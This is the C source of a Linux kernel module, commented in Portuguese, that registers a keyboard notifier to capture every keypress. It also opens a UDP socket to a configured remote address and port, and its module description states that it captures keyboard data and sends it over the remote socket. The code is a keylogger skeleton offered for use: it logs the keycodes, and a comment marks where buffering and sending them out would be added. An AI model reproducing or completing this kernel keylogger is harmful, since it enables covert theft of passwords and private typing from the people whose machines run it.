#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/vt_kern.h>
#include <linux/udp.h>
#include <linux/inet.h>
#include <net/sock.h>

#define REMOTE_IP "127.0.0.1"  // Endereço IP da máquina remota
#define REMOTE_PORT 323          // Porta do socket remoto

static struct socket *sock;  // Socket para comunicação remota

static int capture_key_event(struct notifier_block *nb, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    // Verifica se é um evento de tecla pressionada
    if (code == KBD_KEYCODE && param->down) {
        // Captura a tecla pressionada
        int keycode = param->value;

        // Aqui você pode processar e armazenar a informação coletada
        // para ser enviada posteriormente via socket remoto

        // Exemplo de impressão no kernel log
        printk(KERN_INFO "Tecla pressionada: %d\n", keycode);
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = capture_key_event
};

static int __init my_module_init(void)
{
    struct sockaddr_in sin;
    int error;

    // Registra a função de tratamento para eventos de teclado
    register_keyboard_notifier(&nb);

    // Cria um socket UDP
    error = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
    if (error < 0) {
        printk(KERN_ERR "Erro ao criar o socket: %d\n", error);
        return error;
    }

    // Configura o endereço e porta remota
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = in_aton(REMOTE_IP);
    sin.sin_port = htons(REMOTE_PORT);

    // Conecta o socket ao endereço remoto
    error = sock->ops->connect(sock, (struct sockaddr *)&sin, sizeof(sin), 0);
    if (error < 0) {
        printk(KERN_ERR "Erro ao conectar o socket: %d\n", error);
        sock_release(sock);
        return error;
    }

    printk(KERN_INFO "Módulo do kernel carregado\n");
    return 0;
}

static void __exit my_module_exit(void)
{
    // Desregistra a função de tratamento para eventos de teclado
    unregister_keyboard_notifier(&nb);

    // Libera o socket
    sock_release(sock);

    printk(KERN_INFO "Módulo do kernel descarregado\n");
}

module_init(my_module_init);
module_exit(my_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Seu Nome");
MODULE_DESCRIPTION("Módulo de kernel para capturar informações do teclado e enviar via socket remoto");
